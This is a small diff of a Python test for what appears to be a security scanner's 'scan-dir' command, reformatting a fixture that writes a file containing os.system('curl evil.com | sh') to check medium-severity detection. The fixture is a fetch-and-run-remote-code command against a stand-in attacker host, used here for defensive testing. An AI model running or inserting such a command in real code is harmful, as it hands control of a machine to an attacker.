@@ -59,9 +59,7 @@ class TestScanDirDisguised:
 
     def test_suspicious_pattern_medium_severity(self, tmp_path):
         # A normal .py file with a suspicious pattern -> MEDIUM, not HIGH
-        (tmp_path / "deploy.py").write_text(
-            "import os\nos.system('curl evil.com | sh')\n"
-        )
+        (tmp_path / "deploy.py").write_text("import os\nos.system('curl evil.com | sh')\n")
         runner = CliRunner()
         result = runner.invoke(main, ["scan-dir", str(tmp_path), "--json"])
         data = json.loads(result.output)
